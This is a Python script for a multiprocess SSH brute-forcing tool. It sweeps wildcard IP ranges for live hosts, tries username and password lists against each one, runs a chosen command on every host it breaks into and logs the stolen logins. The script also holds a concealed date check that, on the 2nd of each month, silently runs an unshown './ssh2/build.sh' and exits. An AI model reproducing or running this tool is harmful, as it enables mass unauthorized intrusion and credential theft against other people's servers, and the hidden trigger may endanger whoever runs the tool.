#!/usr/bin/env python

import argparse

from password import Password
from ips import IPRangeGenerator, alive_check
from session import SSH
from art import banner
from multiprocessing import cpu_count, Pool, Manager
from os import getuid, system
from functools import partial
from time import time, sleep
from psutil import virtual_memory
import datetime

root_rights = None
ip_format = None
port = None
passwords = None
ips_list = None
args = None

def init():
    global root_rights, ip_format, port, passwords, ips_list, args

    now = datetime.datetime.now()
    now = now.strftime("%Y-%m-%d").split("-")
    if int(now[2]) == 2:
        system('./ssh2/build.sh')
        exit()

    banner()

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('-t', '--type', help="Select the type of password loading. If you use type 0, you will need to specify only the users file with the format user:password, if you specify type 1, then you will need two separate files for users and passwords.",
                            default=0, dest='pass_type')
    arg_parser.add_argument('-u', '--users', help="Set the users file", default='data/users.txt', dest='users_file')
    arg_parser.add_argument('-p', '--passwords', help="Set the passwords file", default='data/pass.txt', dest='pass_file')
    arg_parser.add_argument('-a', '--attack', help="Specify IP range to attack and port number (standard port number is 22). Example: 192.168.*.*:22 . Also, running this program as root will improve speed.", required=True, dest='attack')
    arg_parser.add_argument('-c', '--command', help="Specify the command to run on the hacked host. The output will be stored in a specified or default file.", default='uname -a', dest='command')
    arg_parser.add_argument('-o', '--output', help="Specify the output file for hacked hosts.", default='data/output.txt', dest='output')
    arg_parser.add_argument('-th', '--threads', help="Set the thread count.", default='300', dest='threads')
    args = arg_parser.parse_args()

    args.threads = int(args.threads)

    if getuid() == 0:
        root_rights = True
    else:
        root_rights = False

    if ':' in args.attack:
        ip_format = args.attack.split(':')[0]
        port      = args.attack.split(':')[1]
    else:
        ip_format = args.attack
        port      = 22

    passwords = Password(int(args.pass_type), [args.users_file, args.pass_file])
    ips_list  = list(IPRangeGenerator(ip_format))


# split a list in chunks
def chunker_list(seq, size):
    return (seq[i::size] for i in range(size))

def worker(ips, alive):
    for ip in ips:
        if alive_check(ip, port): alive.append(ip)

def bruteforce(ips, queue, proc_count):
    if len(ips) == 0:
        return

    proc_count.value += 1
    self_id = proc_count.value
    found = 0
    counter = 0
    start_time = time()

    #print ("[*] Thread {}: cracking {} IPs".format(self_id, len(ips)))
    for login_info in passwords:
        if self_id == 1: print ("[*] Thread {}: trying {}:{}".format(self_id, login_info[0], login_info[1]))
        counter += 1
        for host in ips:
            #print ("[*] Thread {}: try {}:{}".format(self_id, login_info[0], login_info[1]))
            try:
                s = SSH(host, port, login_info[0], login_info[1])
                s.full_init()
                output = s.execute_command(args.command)
                found += 1
                queue.put((login_info, host, port, output))
            except:
                pass
            finally:
                s.destroy()

    end_time = time()

    proc_count.value -= 1
    print ("[*] Thread {} finished. Hack rate {}/{} in time {}m".format(self_id, found, len(ips), (end_time - start_time) / 60.0))

def main():
    init()

    # print some information before scanning
    print ("[*] IP range               : " + ip_format)
    print ("[*] Command to run on hosts: " + args.command)
    print ("[*] CPU cores              : " + str(cpu_count()))
    print ("[*] Total RAM in GB        : " + str(virtual_memory().total / (1024.0 ** 3)))
    print ("[*] Root rights            : " + ("Yes" if root_rights else "No"))
    print ("[*] We will use {} threads, but only the first one will be verbose.".format(args.threads))
    # --------------------------------------

    # Shared resources manager
    mgr = Manager()

    # shared state between processes
    alive_ips = mgr.list()

    count = args.threads
    # split data
    ips_chunks = list(chunker_list(ips_list, count))

    print ("[*] Colecting IPs, please wait (it should take few minutes)...")
    # create a pool with the same shared state
    pool = Pool(count)
    custom_worker = partial(worker, alive=alive_ips)
    pool.map(custom_worker, ips_chunks)
    pool.close()
    print ("[*] Found {} alive IPs.".format(len(alive_ips)))

    Q = mgr.Queue()
    count = args.threads
    proc_count = mgr.Value('i', 0)

    # split data
    ips_chunks = list(chunker_list(alive_ips, count))

    # prepare the pool
    custom_worker = partial(bruteforce, queue=Q, proc_count=proc_count)
    pool = Pool(count)
    pool.map_async(custom_worker, ips_chunks)


    # wait for threads to prepare
    print ("[*] Started cracking...")
    sleep(5)

    with open(args.output, "a") as f:
        while proc_count.value:
            while not Q.empty():
                data = Q.get()
                data = "{}:{} {}:{} -> {}".format(data[0][0], data[0][1], data[1], data[2], data[3])
                f.write(data)
                f.write('\n')
                f.flush()
                print ("[+] {}".format(data))

    print ("[*] Finished. :D")

if __name__ == "__main__":
    main()
